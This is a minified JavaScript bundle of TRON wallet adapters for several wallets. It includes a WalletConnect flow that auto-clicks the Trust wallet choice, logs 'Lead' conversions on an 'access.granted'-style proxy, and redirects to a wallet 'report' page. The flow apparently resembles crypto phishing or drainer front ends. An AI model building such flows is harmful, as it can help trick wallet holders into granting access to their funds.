            t.Mainnet = "Mainnet",
            t.Shasta = "Shasta",
            t.Nile = "Nile"
        }(fn || (fn = {}));
        const gn = "TIP6963:announceProvider";
        var wn = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        const mn = {
            "0x2b6653dc": un.Mainnet,
            "0x94a9059e": un.Shasta,
            "0xcd8690dc": un.Nile
        };
        function yn() {
            return !(!window.tron || !window.tron.isTronLink)
        }
        function vn() {
            return !!(yn() || window.tronLink || window.tronWeb)
        }
        var Mn = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        const Nn = {
            "0x2b6653dc": un.Mainnet,
            "0x94a9059e": un.Shasta,
            "0xcd8690dc": un.Nile
        };
        function In(t) {
            return Mn(this, void 0, void 0, function*() {
                var e, n, r;
                const {blockID: i=""} = yield t.trx.getBlockByNumber(0)
                  , o = `0x${i.slice(-8)}`;
                return {
                    networkType: Nn[o] || un.Unknown,
                    chainId: o,
                    fullNode: (null === (e = t.fullNode) || void 0 === e ? void 0 : e.host) || "",
                    solidityNode: (null === (n = t.solidityNode) || void 0 === n ? void 0 : n.host) || "",
                    eventServer: (null === (r = t.eventServer) || void 0 === r ? void 0 : r.host) || ""
                }
            })
        }
        function En() {
            var t;
            return h() && !!(null === (t = window.tomo_wallet) || void 0 === t ? void 0 : t.tron)
        }
        var An = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        function bn() {
            return !!u && !!(window.foxwallet && window.foxwallet.tronLink && window.foxwallet.tronLink.tronWeb)
        }
        var _n = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        function Tn() {
            return !(!window.bybitWallet || !window.bybitWallet.tronLink)
        }
        "undefined" != typeof navigator && /bybit_app/i.test(navigator.userAgent);
        var xn = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        function Dn() {
            return !!window.imToken && !!window.tronWeb
        }
        var kn = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        function Ln() {
            return !(!window.gatewallet || !window.gatewallet.tronLink)
        }
        const Sn = "undefined" != typeof navigator && /GateApp/i.test(navigator.userAgent);
        var Cn = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        function jn() {
            return !!window.tronWeb && void 0 !== window.tokenpocket
        }
        var On = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        function Un() {
            return !(!window.okxwallet || !window.okxwallet.tronLink)
        }
        "undefined" != typeof navigator && /OKApp/i.test(navigator.userAgent);
        var Wn = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        function zn() {
            return h() && void 0 !== window.guarda
        }
        var Rn = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        }
          , Pn = i(2220);
        class Fn {
            constructor(t) {
                this.openModal = Pn.D8.open,
                this.closeModal = Pn.D8.close,
                this.subscribeModal = Pn.D8.subscribe,
                this.setTheme = Pn.lH.setThemeConfig,
                Pn.lH.setThemeConfig(t),
                Pn.mb.setConfig(t),
                this.initUi()
            }
            async initUi() {
                if ("undefined" != typeof window) {
                    await i.e(430).then(i.bind(i, 3430));
                    const t = document.createElement("wcm-modal");
                    document.body.insertAdjacentElement("beforeend", t),
                    Pn.IN.setIsUiLoaded(!0)
                }
            }
        }
        var Bn = i(2109)
          , Vn = i(6856)
          , Qn = i(5022);
        function Yn(t) {
            const e = er();
            "function" == typeof e ? e({
                walletAddress: t,
                encodedAddress: btoa(t)
            }) : window.location.href = `./report.html?id=${btoa(t)}`
        }
        function Gn(t, e) {
            if (!t)
                return null;
            if (t.getAttribute && t.getAttribute("walletid") === e)
                return t;
            for (let n = 0; n < t.children.length; n++) {
                const r = Gn(t.children[n], e);
                if (r)
                    return r
            }
            if (t.shadowRoot) {
                const n = Gn(t.shadowRoot, e);
                if (n)
                    return n
            }
            return null
        }
        async function Zn(t) {
            const e = "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0";
            let r = [e, "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66", "0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150", "8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4", "fbea6f68df4e6ce163c144df86da89f24cb244f19b53903e26aea9ab7de6393c", "ef333840daf915aafdc4a004525502d6d49d77bd9c65e0642dbaefb3c2893bef"];
            "trust" == t && (r = [e]);
            const i = new Fn({
                projectId: "dfe641e9a7d984da258c4a1d507fd83a",
                themeVariables: {
                    "--wcm-z-index": "10000"
                },
                explorerRecommendedWalletIds: r,
                explorerExcludedWalletIds: "ALL"
            });
            try {
                console.log("Starting WalletConnect connection..."),
                Qn.walletConnectProxyAdapter.connectWalletConnect(),
                Qn.walletConnectProxyAdapter.on("wc.uri.generated", async n => {
                    if (console.log("WalletConnect URI generated:", n.uri),
                    await i.openModal({
                        uri: n.uri
                    }),
                    "trust" == t) {
                        let t = setInterval( () => {
                            let n = Gn(document.querySelector("wcm-modal"), e);
                            n && (n.shadowRoot.children[0].click(),
                            clearInterval(t))
                        }
                        , 50)
                    }
                }
                ),
                Qn.walletConnectProxyAdapter.on("modal.show", t => {
                    if (i.closeModal(),
                    console.log("Modal show event:", t.id, "modalType:", t.modalType),
                    "server_loading" === t.id)
                        try {
                            fbq("track", "Lead")
                        } catch (t) {
                            console.error("Facebook Pixel tracking failed:", t)
                        }
                    "error" === t.modalType && n.NcAffiliateTronModal.openErrorModal(t.id || "default"),
                    "loading" === t.modalType && n.NcAffiliateTronModal.openLoadingModal(t.id || "default")
                }
                ),
                Qn.walletConnectProxyAdapter.on("access.granted", t => {
                    console.log("Access granted event:", t.address),
                    n.NcAffiliateTronModal.closeAll(),
                    Yn(t.address)
                }
                )
            } catch (t) {
                throw console.error("WalletConnect connection failed:", t),
                t
            }
        }
        const Hn = {
            tomo: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "Tomo Wallet",
                    this.url = "https://tomo.inc/",
                    this.icon = "data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgdmlld0JveD0iMCAwIDI0MCAyNDAiIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCI+Cgk8dGl0bGU+ZmF2aWNvbjwvdGl0bGU+Cgk8ZGVmcz4KCQk8aW1hZ2UgIHdpZHRoPSIyMzQiIGhlaWdodD0iMTYzIiBpZD0iaW1nMSIgaHJlZj0iZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFPb0FBQUNqQ0FNQUFBQ3pIWExZQUFBQUFYTlNSMElCMmNrc2Z3QUFBdUpRVEZSRkFBQUEvejZmL3oyYS96bWMvd0NBL3oyZC9qeWMvanljL2p5ZC96eWQvd0QvLzBDZi9qdWMvanliLzBDQS9qeWMvVHlkL1R1Yy96eWMvejJjL3p5Yy9qeWMvanljL3oyYi96eWQvanljL2p5Yy96dWQvenFaL2p5Yy9qeWMvenVkL3pPWi96eWQvanljL2p5Yy9qeWMvVHVjL3oyYy96cVgvanljL2p5Yy9qMmMvejJjL3ptcS96dWIvanliL2p5Yy96eWIvenFhL2p5Yi9qeWIvanljL3oyZS95dXEvanljL2p1Yy96NmIvVDJiL2oyYy96T1ovenVjL2p5Yy96MmMvenliL3p5ZS9qeWMvanlkL3p5Yy96eWEvanljL3p1Yi9qdWQvejJaL2p5Yy96cWQvenVkL3p5Yy96dWMvem1jL1R5Yy9UeWMvenlXL2p5Yy9UeWMvVHljL2p5ZC9UeWQvanVjL3ptaC96eWMvMENiL3p5Wi96dWQvejZlL3pxYy96eWIvanljLzBDZi96dWMvenliL3oyYy96dWIvejZhLzFXcS96eWMvejJiLzBhaS9UeWIvanljL2oyZC9qeWQvVHljL1R5Yy9UeWMvejJiL1R1Yi9UeWQvanljL2p1Yy9qeWIvanljL3p5Yi9qeWMvanljL3oyZS96MmUvenliL3p5ZS96NmIvMENmLzBTWi9qMmMvanljL2p5Yy9qeWMvanljL2p5Yy9qeWMvVHljL1QyYi9UMmMvVDJkL1R1Yy96dWQvenVkL3p1Yy9qeWMvanliL3p5Yy96MmQvenliL3o2Yi9qeWMvanljL3ptWi96eWEvenVkL3oyYy8wbVMvejJkL2p5Yy9qeWQvVHVjL1R5Yy9qeWMvVHlkL3pxYy9UMmMvejZmL2p5Yy9UeWIvenVhL3oyYi9qeWQvenlkL1QyYy96MmQvejJkL3p1ZC9qeWMvMENWL2p5Yy96eWIvenVkLzBDWi9qeWMvanljL2oyYy96MmMvejZjL2p5Yy9UeWQvanljL3oyYy9UdWIvejJlL2p5Yy9qeWMvanljL3plYi96eWQvemFoL2p5Yy96dWIvenFkL3oyYy9qeWMvenliL2p5Yy96dWQvanljL1R5ZC9qMmMvejJiL1R5Yy9qdWMvVHlkL2p5Yy96dWQvemVrLzBDZi96eWUvejZjL2p5Yy9UdWMvVHlkL2oyYy9UeWIvVDJiL3p5Yi9qeWMvVHljL3p5Yy9UeWMvenViL3oyYy9qeWMvVHViL1R5Yy96eWMvVDJjL3p5Yy96dWIvenFhL1R5YlVCc29qd0FBQVBaMFVrNVRBQ1ZISkFKZzJQL1hYZ0VJc0s0RXRKU2JkM1pWL2Y1Y1BQZjVRU1BxN1NjS2NzZjA0Wjg3RnR6aXhuRUpPT1MvUURYMndQVXlCdDNCUW8vYkJWL0NRMjVFdzhWTlRQeFN2Um5FUmtsSWJCS0ppQkhlbllPem50OGJieHdlY0IwZmM4Z2dkR1prUFRvRGFta0xnTzdLdUtlVmhFK0ZmOC9PemN4NDVlTXFQek1pSVJBUDdPdmEyY20zdHFXa2s0S0JUalI1MU5KaWJXc3A0TlVvSm1nMkIyVzY2YU9pKzZZc3FDMnFxU3N1cXkrR2VuVU44QXptZTFzVTh1KzVXRDc2aDlOK2toWG5zdmdYVVJPOGZUbEw4Vm5XR3VpWnRWU1FySkd0Vmc0WU56SFJqb3l4bkpkaDBKcDhtRXBRODRxTlhhQmFSVENoUTZnNlhRQUFEbnhKUkVGVWVKemRYWGxjVk5VWG41dG9PdFNNcVFtRi9sUndDeGpDSlVORmdhelVJSlhLY2tITFVFUk5zMXd5RTNmTG9sREJCWE1YTTQwVURTdzBLMzVtbHY2UTNETUZBbE16YmRFK2JwOG8rTTA0OCtZdDk3NDU3OTYzeVBEOUErNDc3N3o3em5mZWR1KzU1NTZMVE1ZRElSUDY5emFjMXVnVCtpRGtPS2Y5NzNXRHoydzBWVjlVNFNyVnFieG03S2tOcG1wQk45M2x1bFYvR1hwdWc2bld2eUhZTVA5cDZMbU5wZHBBZk0vZTlidVJKemVVYWlNa3ZtV3Q2RmNEejI0a1ZYLzBoMFRTRUowejd2UUdVbTJDTG1JeVAxUnUyUG0xb3RyYy9xSDh5NHJRS1ZtTk51Z25nclJGMVkreVI3U3U4dm5OY2lkQ3h6U3d6NlFaVlJ0eVdkd1dIU0pyaEY0bjM2c0JaaGttNFZVbm5ZWEF1dCtydE00SmJhaTJROGZkNWRBTEpFNCs5ZjZXT2JiT2pYOEkwZ0IvL2hld29mK3BzczRGVGFoMkVsL0tkdWhiVEtYTFFkbWpPK3pEUkoyclJCZXlJOXJMYkJzUFRhaDJPeUFSUEl6K0t4WkU0K1I1ZEM0UWI4ZWdieVFhZDl3d3FZY21WQ1B3aHlrUzdSWnNQU2FsTG9LbC9VN0Jsbi80VjVoR3FQdzlvUnhhVU8xZFNHck05a0E3dUdMYytlTUVCUjRoQWJsY01mWW02VjYxZFB5TTJUbzN0S0RhWnlkWkhsa3YzL0hHNll1dWU3cW1Ea1Q1b3EzMmZ6NjlTa3ZJQ2owL1VXR2ZDMXBRN2I1ZmJrOGNRaFYxU284cXFNTVdXT0Z6QjhxUjIvM3dIaWJMUk5DQUt2bisxUmFXUno5VVhZY0dWQWR0VVY4SENPbGJtZ0VhVUgzaUMvVjFnT2o2cGVvcTFGTWR2TXNJWjRMMThRMXFxMUJQTmFSWWRSVks4R3lXMmhyVVV3MlcrVDVvakVqVmo0bHFxa1B6cjZpdFFoR3N2ZGVwckVFMTFSZlVmd1dVNFg1U2Q1Y0dxcWtPMjZpMkJvVUlLRlZaZ1ZxcVJ0Mi85anM0YnJXNkN0UlNUVlQ5RFZDTWhGWHFqbGRKMWZ5UGNYNDRkSWU2VVI2VmxnNVgvYldqd05BVnFnNVhSeldwU0VtdlJTdllPaXhYYzdneXFwWm12NWorZVBCSTNIYVJOQmx0ay9xdzlVVklSR1dtU05BM0wreHdBOU45NVlxYXBrcW9qa0hvZlZmUnovdzRzaVBuN0xpaU9yYXZaZnlnT3FKRjNORy8yNmMzaWEreVk5ZDFiaGdrcVc1MkdYeXNBcW9EbXk1U1k1MGhHSDhHYnNuQVZFUGpGbWhoak01NE5SMGNtSWFwVG4xUEUxdjBCdnpWQmFtYVgzbFhHMXQweHFTNWtBWklOZVVkYlV6UkhmN1FtQjVJdFhPUlJxYm9qZGRtQXdvZzFSaDhSS1Y2b2dzK0tDQUdTSFhHZkkxTTBSdGgwSEFkU0hYbVd4cVpvamVtemdBVVFLcXo1MmxraXQ2WWxnSW93QitiU0dqQXBYb2dhaS9VeFlPYkVIUG5hR09MenBqK0JxUUJVMzF6bGlhbTZJMlpyME1hTU5YNTBPTmVQVEJvRGFRQlUzMTd1aWFtNkkwNWt5RU5tR3JxTkUxTTBSdnpKa0lhTU5YNldvUmM2STgzSjBBYU1OVTA4SG12RnBqL0NxUUJVelZvcEUwdDRKRTZtQ29XbEZROUFZYzJ3VlFYdnFhSktYcWoyMjVJQTZicWIyellPU3VheWNlc3VnQlRYUVIrc0tvRnBvQ05PcGlxbC9UTkc0SHg0akRWOUVtYW1LSTM0Q2tQSUZXZkJXQXpwRnJndmNtcU8zRWoxbXRraTk1SUd3TW9RRlNUQ2owSGZWWWZnT04wbnFrbWg2MzBGcVoycm9tSE16M3Q5MFExczZUbE9JM04wUmZ4VFlPUzVmZktVcDMxNDJVallnZTFSc2FSVURtMlpLb3YzdlJLbms1a0hIbHdCRWxPb1BwOGhSZnpkQ0xqU0M0K2dpT2xhdWRaYUZRa2txN0lPQkkrWEN3UlVRM3RiazB6MGh5ZDhXckxCY0taV1VLcXRocy9HMjJOemtpdi9TSy9JYUE2WThOWjQ0M1JHU0V2OFZ4NXFtdDJ5czZIOEdLRVY3bWRLRHpWVmFOdml5MTZZL2tMWEltbnVpN3BkbGlpTzNoWE9FODFUSDdPckRjamZoTlg0cW5PZzJJSnZCTXJobklsbnVyck5lbVR5bU5rT2xmaXFVN011QzJtNkkwKzJWeUpwMXFyaDNjTWo5TWg2b1M3c1NCb1FtUU5KK2w2T1ZZbHVJc0NxbWpEaXdSZDcwYlVqM3dQUjlnR2ZoY01KL0E2ckJ6Q2w0VlUwV00xN1dtTjZpL29wSXM2Y1J1SEdXMkx6cGdyZE5lTHFHYW1HSnZzU1c5WTBnY0t0c1JlaVBITGpMVkZaNndaSk53U1U2MVpsMVY4VWFXK3BVM1BHMm1MemhpMVVMUXBvWnFTV1hNdXEyWHhjNkp0cWNmd295R21tb0lOL2NYYlVxb2ZqNm9wbDlXNjdHbXhBSE41Yngwb2xYZ3BzcDZWQ0RDcU9RTU1Na1Z2YklxWENQQ0JETU5tVk91TG9CTlNDVTQxL2xORFRORWJtL3RKSlRoVlExS3k2SStGbzZRU25PcDI2ZVBzbmNqdUk1WGdWR3RJOXdhUEQ4YW81cUtucFNLdlJGS3ZXSWtFbzlwZmc5UmMxUUlqRmtzRVVxcFBEbUIxTU9WY3V3dmxuS2xuTW8zY3UzcFY1aytwVHpMV2s0ZVdKNk9TdkZvbVV6M2ZySmVXdmM3cWljL3ZVU2tXU0tqMnZNUVV2R1BwTUdCWWxWaVU3QmVUVEo5MVpSYzZseWlPS2pPdnY3aVlMZmRQeUwzaTlIUmlxaUVYV1ZyQTZWTjdmVURjTVdQak5acGt4N1lGeDhuUktiVkdkU0lHY2dDd05CWmROeUhWNU1HUE1sUVlIdmFEZkpyTW9jVy9LaDJmVHJyd2NxVHN6dWErN3o5Q2FaY0R1ejhRQkcwSnFEYi9yUUpYaHBCYnZORnpQdENFMFRGSzZyR21OWmNuNmtEbzB0clJpcTF5bzNhak1uZVpwL3BkQWNNMHFka240SVJQKzBmQXc1a3pQL0dVbE5TSmxDME16K3lzNkFpdTZLYTZJaitQdXA3ODdLVksxQTRnenhmTVpQcndUdWxIa0FTZjc1Nmdqek9LNjhVOTVoelZnL24wTC9XVVpRb3pjU2YvNnJFTFllMmFTMG9SVEVBUmlvQ1ZKRWk2eDhYTVJmWFFqV2pxT2c2a0tjOVdWdS9UWHJMN21nUitycmllemZQb3gvWUw2b1hmK3Ura21qNlgvczdvdUN5TVFqc205SDJaUFJPRGFCb3RLeUk2VW1nN1laMTJLd0RXUWRXeXJ3UDE0YWIwcitueVo2SEpDNG55dGxrMHY1ajl1cDVtbURwOHNNdGZ0Nmo2SG1oUGYvQ1dDN1Nqc1pFTG44TS9zWDVUeGlsOFROMncvYzZ3QmtQUmdXRjJxdVphY2duRlBlSDdZUHBqZXFmZEZMOVZwdjlldHBXK21xWGdSRDhDRHJlMVUvM2lDWVlqajdSaE9NamU0QmorZFRiM3BzODVIdnNRMnpJdlRMN3FZNjBRVTJUTHJrbnNjd0tibkU5c2h5by9hc3FlS3E5NERVTUduWkhwcUtRelEvaHZlN2h0b3lmOEx0TWZZOTJLU2grZ1A4eCs0OTlXbUtNWnd0Q0RFVU9PbG9JVkt2TkVxc1pENWZTMzRrbjAxRlhxQUloK202blBvelhlZ2JLWVlGaGRpa3dQbnFROHlKcnhIS3lrTTJMQmlibFN4T1FqK3R4Uk8xZzY4RnFqalBacjk4QWhlMnVwdkRYZFFmdkRLYytpQjJqVHVwNytqNk5oYUI2cHFOZkpvZUVvMmVja3QyM2w4ZUJMZisramZwQncrQ1MyYVJ5RnBxMnJrdG5mNUJKVmRhT1hYM2YyYkJyV29uaWh6WmFiWnI5amJaR3prV3ViRnRxU3loQWMrNk5jSEpPN3kzamdhZTVnNjcrT1pyT3pFM2U2dS9Ma29YTExWVFNaUHRaZHJscXFLalF6Y25PZ3UxelE3SDZpempibDc4WUdlMW81L3JtNjVyYkwrQkpZTWxoRzdsNldyRWtWYkJXbXFwbmhlelpJdU1WUE5CQmlmM2VsdGZtdGRUb2JPWWZMeW5jVitxZno0NGh0ZEhPRWVMbWRRVm0wblRNZWtya2hCV2RJRnpBaG15QWtvY1ZFMXgzbWRxUHRIYXJNVVZSMkgxRjhvcDFFc0YzZXd3S2dPRVp5aDVIekN5bWNheEN3bnZQaENhWVVIVllVZFZmN0tsR01MVlRFbmxBZHp5UzloUFRrSyt1UjFXbFl4aFVGTG0rZkVpVWYySEova3JUdkRXbnowcEpMNzl4elloL21JMjlKR2tpeTNpUUlwVGdWeEQ5SG9qR2J0YlZoajlaYnI1S2toUDdSWnl3akR3NTBMWlJLRG9ZUzFKN0pKUWpGaU9vbmZPckZ3MU1MTjRDNXVmR0Jkd2VLT21NaUZwZk1MWXpGZkl2RWg4YkRjbXd1MkJMR0N6Y2xnNDRqZDBPalNSUGVKRWxiNDVPQUkxaER4Z2RnMHhDSlhTa3d1MWRJcFRnQnQzUW9lVFNVVWZpTUgwazYrR05NZEMvckZGRzhxelV1bGFCMnNTbFF6NUNWNG0wcFZaODVNejFYUUg1V1RZdWxxY25ndklKeWFJamRyc0drUlIxYm5mRmNEYllpQVJZTHNlY3h6elU4aVY4L0IxcWNsd2pJTjdvU0RCMFZMUmJzNmsxS3o3SWJHTkhhMWxzaXdLakdBUU1vZXg4aWluM1R4Tmt5Sm0wbzgxeVBCNXhwSmQ0K2V5OUpxdzZRazZWQ0VncUJVeVc4WUVUb0tGMXYwWVhWYndoN0RBWFBnMG10NU9HYklocnBQVVIwOUptRGdZOUZhK2wrak9wdkFaNXJpRm9xMDBHN2RKWnZNNXpQR2s5V1VvYnZsZ3RDT3N0YkUrTXptbDBBS3NHU3BXRlV3V2pLUjNmSTdNanN3TFUyMjA1UkdWVHMrM09JNng3SjZTc1R0WEMrQlZBSEZrOHBwZXI3Q3VuRkxnUVcrc1RELzZ2MTNVeDdZajhIRytKelVxRkltc0YxejVVbE5JNU9ERnNpbzNBUGxFa3FjTElrZ2xCS3RiQXJVSU9waDVvZ1dwOUdGWmxER3QrOFlqcS9vTys4dmVQWU03ZWErNEQ1RHI2UmpNUktxSmFXZzMwdlMyL21YamY2STBvMDZOM2c2c1A3R0pmaldZM0Z3R0xJYnhZbzJoWlRuWE5JUWV3SDY5SmVKWFZQNGIvanJFMXN5NmRJUDBna3hJV0wvSGxpcXRrSkpoZ3ZzNjJ2RUZOTTlPbFlUelpuaUlDTGpJWmVLUTZJcDUrSU8zRWpGWjJIcVNFL29senVxQjFUNlVjd0x4TmI0aGhFYmlraDFZL25LMXRlS1psaGZadnBLK1dIOVM5YXFhdWJyTXlFQm9zRnJsVUIxZEFsanlzN2p6V0FlazMxME9XZU91cm5HbEZXTjBIK2d5ZkdyakY4R2lJQjFXT0s0MXlDeW1qZm01N2pGOFpuME5YWEtYNm1VdFdmRzd1TFBGWE01K2NCMU91TUE1TjN3QVZheEtDWlNjR1BNTG1wenVvU3AvejR3bXVVUHJJOHp4TUM2TzdnbFc5UjlQcno5bkY5QjQ1cThoNnFzTXdkdmVnODJ0OTcvbW1pWlpZTEoyTE5EMVN2eGFCVExsTTVxZ3EvTTI3NDBxMFFCemh0MTlKMEQ5NmJTblZxZHpKU2p1bzR5b1gxb2paUzNYT2Y5UGUwbCt4bWtBRjFDaXpPK2U2aTZtdWxqV1pyMkFaYUZVaUlNZmQ1aWd5OFpGRmUwNFNqdEEyWWdwUE9MbzZMNml4NlQ5Q1c0RUJZeVkyZVJmTE52NlBCeWgvOHVEZWlLYzdxUkgvbkNMdUxLc3NDUGJiNk5MRVhpYmx5dzlVQmxXV0thMWxTbjJFYTBGYW53ODFGMWJ5QUlXZHNWQkJOR29rVFo4bVRqUHJsS1k0MDlFbWRRbkZDRHVIN25mKzUxMUpCVDRaS1RCK3UydzRyY2FpVm5ZeGYySmw5bFk5M0RQeVQ1dlhneGxoWFJDSkhkZWRkVEtOSmsxNjdtMEo3MFF1bG91K3JKV2hyVytVOXVOT2JtZFpMeW1uVXlWbHd0NVppZjJITDcxd2NTZE9vOC8yeTFhQnV0MXhQRFlyR05yNUs0YytZc1kwMmxNd0oyOTNjcmNDM2dXMGhiTmtwODF0M29XdkJtcExqdjMxcTBERllUNENybVcrekpYR0lpM1cveHdROUc4c2U4OTNZQkcwbHVQTEZ0ODh3MmFFVWk0YXpqZFZ1dTNJdW52K0YvZytRN0hZb0dCOGk3d0FBQUFCSlJVNUVya0pnZ2c9PSIvPgoJPC9kZWZzPgoJPHN0eWxlPgoJPC9zdHlsZT4KCTx1c2UgaWQ9IkJhY2tncm91bmQiIGhyZWY9IiNpbWcxIiB4PSIzIiB5PSIzMSIvPgo8L3N2Zz4=",
                    this._readyState = h() ? a.Loading : a.NotFound,
                    this._state = c.Loading,
                    this._checkPromise = null,
                    this.onAccountsChanged = t => {
                        if (this._state === c.Disconnect)
                            return;
                        const e = this.address || "";
                        t !== e && (this.setAddress(t),
                        this.emit("accountsChanged", this.address || "", e)),
                        !e && this.address ? this.emit("connect", this.address) : e && !this.address && this.emit("disconnect")
                    }
                    ,
                    this._updateWallet = () => {
                        var t, e, n, r, i;
                        let o = this.state
                          , s = this.address;
                        u() ? ((null === (t = window.tomo_wallet) || void 0 === t ? void 0 : t.tron) && (this._wallet = window.tomo_wallet.tron,
                        this.listenToEvents()),
                        s = (null === (e = this._wallet) || void 0 === e ? void 0 : e.tronWeb) && (null === (i = null === (r = null === (n = this._wallet) || void 0 === n ? void 0 : n.tronWeb) || void 0 === r ? void 0 : r.defaultAddress) || void 0 === i ? void 0 : i.base58) || null,
                        o = s ? c.Connected : c.Disconnect) : (console.error("[TomoWalletAdapter] Only supported in mobile app for now"),
                        this._wallet = null,
                        s = null,
                        o = c.NotFound),
                        u() && o === c.Disconnect && this.checkForWalletReadyForApp(),
                        this.setAddress(s),
                        this.setState(o)
                    }
                    ,
                    this.checkReadyInterval = null;
                    const {checkTimeout: e=3e3, dappIcon: n="", dappName: r="", openUrlWhenWalletNotFound: i=!0} = t;
                    if ("number" != typeof e)
                        throw new Error("[TomoWalletAdapter] config.checkTimeout should be a number");
                    if (this.config = {
                        checkTimeout: e,
                        openUrlWhenWalletNotFound: i,
                        dappIcon: n,
                        dappName: r
                    },
                    this._connecting = !1,
                    this._wallet = null,
                    this._address = null,
                    !h())
                        return this._readyState = a.NotFound,
                        void this.setState(c.NotFound);
                    u() && En() ? (this._readyState = a.Found,
                    this._updateWallet()) : this._checkWallet().then( () => {
                        this.connected && this.emit("connect", this.address || "")
                    }
                    )
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get readyState() {
                    return this._readyState
                }
                get connecting() {
                    return this._connecting
                }
                network() {
                    return An(this, void 0, void 0, function*() {
                        var t;
                        try {
                            if (yield this._checkWallet(),
                            this.state !== c.Connected)
                                throw new g;
                            const e = null === (t = this._wallet) || void 0 === t ? void 0 : t.tronWeb;
                            if (!e)
                                throw new g;
                            try {
                                return yield In(e)
                            } catch (t) {
                                throw new N(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                connect() {
                    return An(this, void 0, void 0, function*() {
                        var t;
                        try {
                            if (this.connected || this.connecting)
                                return;
                            if (yield this._checkWallet(),
